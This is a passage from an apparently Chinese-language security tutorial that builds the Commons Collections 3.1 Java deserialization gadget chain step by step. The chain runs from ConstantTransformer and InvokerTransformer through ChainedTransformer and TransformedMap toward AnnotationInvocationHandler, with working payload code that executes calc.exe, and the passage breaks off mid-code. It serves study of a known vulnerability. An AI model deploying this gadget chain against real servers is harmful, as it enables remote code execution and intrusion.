回想之前对于InvokerTransformer中`Class cls = input.getClass();`的解释
> 这里我们需要注意到`input.getClass()`这个方法使用上的一些区别：
>
>   * 当input是一个类的实例对象时，获取到的是这个类
>   * 当input是一个类时，获取到的是java.lang.Class
>
我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:
    //InvokeTransformer关键语句：
        public Object transform(Object input) {//input为我们设置的常量Runtime.class
            Class cls = input.getClass();//！！！这里由于input是一个类，会得到java.lang.Class
            //在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        }
那么我们好像陷入了一个死胡同：  
得到Runtime类实例才能调用exec方法。  
而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例.........
.....................非常的尴尬.......................
#### 第二点九步 还是反射机制
那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？
**还是反射机制**
已知：
  1. 我们开头不能获得`Class.forName("java.lang.Runtime")`，只能得到`Class.forName("java.lang.Class")`
  2. 我们可以有任意的反射机制  
求：
  3. 我们要获取到Runtime.getRunime函数，并执行它。  
解：
  4. 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制
  5. 通过getMethod函数获取Runtime类中的getRuntime函数
    * 在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的
  6. 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数
  7. invoke调用getRuntime函数，获取Runtime类的实例
    * 这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类
> 具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。
我们的最终目的是执行  
`Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")`
先来获取getRuntime类
    //目标语句
    Class.forName("java.lang.Runtime").getMethod("getRuntime")
    //使用java.lang.Class开头
    Class.forName("java.lang.Class").getMethod("getMethod", new Class[] {String.class, Class[].class })
            .invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]);
            //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数
对照着InvokerTransformer类转变为transformers格式
    Class cls = input.getClass();//cls = java.lang.Class
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法
    return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
           //还需要填充 调用getRuntime得到Runtime实例,
            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
    };
还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照
    //input=getRuntime这个方法
    Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类）
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法
    return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数
以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。  
首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：
    public Object invoke(Object obj, Object... args)
    //this.iMethodName="invoke"
    //this.iParamTypes=new Class[] {Object.class, Object[].class }
    //外面class、Object封装是InvokerTransformer类的构造函数要求
按照invoke中的input才是它要调用的环境的准则。  
`invoke方法.invoke(input, this.iArgs)`实际上等于`input.invoke(this.iArgs)`，  
而input=getRuntime方法，那么只要填入`this.iArgs`就好了
又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。  
`this.iArgs=null,new Object[0]`
那么整合就如下：
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
    };
以上代码其实就是等同于  
`((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec("calc.exe");`  
我们笼统的来理解，实际就是如下（这里偷一张[orleven](http://blog.orleven.com/2017/11/11/java-deserialize/)的图）：
总体上来说：利用了反射机制调用反射机制的函数，绕过了开头cls只能为java.lang.Class的限制，根据具体环境input环环相扣，特么竟然恰好就通了  
....非常的微妙....
### 第三步 TransformedMap
那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了 **payload在客户端自定义**
这一目标，我们看一下目前的攻击流程
    public class commons_collections_3_1 {
        public static void main(String[] args) throws Exception {
            //1.客户端构建攻击代码
            //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
            //将transformers数组存入ChaniedTransformer这个继承类
            Transformer transformerChain = new ChainedTransformer(transformers);
            //payload序列化写入文件，模拟网络传输
            FileOutputStream f = new FileOutputStream("payload.bin");
            ObjectOutputStream fout = new ObjectOutputStream(f);
            fout.writeObject(transformerChain);
            //2.服务端读取文件，反序列化，模拟网络传输
            FileInputStream fi = new FileInputStream("payload.bin");
            ObjectInputStream fin = new ObjectInputStream(fi);
            //服务端反序列化成ChainedTransformer格式，再调用transform函数
            Transformer transformerChain_now = (ChainedTransformer) fin.readObject();
            transformerChain_now.transform(null);
        }
    }
完成命令执行服务端执行如下操作：
  1. 服务端反序列化我们的输入成 **ChainedTransformer** 类型
  2. 调用这个输入的transform()函数
转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。
#### 封装成Map
由于我们得到的是ChainedTransformer，一个转换链， **TransformedMap**
类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。
这样我们就可以把触发条件从显性的调用 **转换链的transform函数** 延伸到 **修改map的值** 。很明显后者是一个常规操作，极有可能被触发。
`TransformedMap`
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
try一下：
    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);
        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(outerMap);
        //2.服务端接受反序列化，出发漏洞
        //读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化成Map格式，再调用transform函数
        Map outerMap_now =  (Map)fin.readObject();
        //2.1可以直接map添加新值，触发漏洞
        //outerMap_now.put("123", "123");
        //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
    }
亲测有效
### 第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点
上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。  
之前也说过完美的反序列化漏洞还需要一个readobject复写点，使只要服务端执行了readObject函数就等于命令执行。
在jdk1.7中就存在一个完美的readobject复写点的类`sun.reflect.annotation.AnnotationInvocationHandler`。  
我们先看他的构造函数
    AnnotationInvocationHandler(Class var1, Map var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时
            this.type = var1;//传入的var1到this.type
            this.memberValues = var2;//我们的map传入this.memberValues
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
readobject复写函数：
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            //默认反序列化
            var1.defaultReadObject();
            AnnotationType var2 = null;
            try {
                var2 = AnnotationType.getInstance(this.type);
            } catch (IllegalArgumentException var9) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
            Map var3 = var2.memberTypes();//
            Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器
            while(var4.hasNext()) {
                Entry var5 = (Entry)var4.next();//遍历map迭代器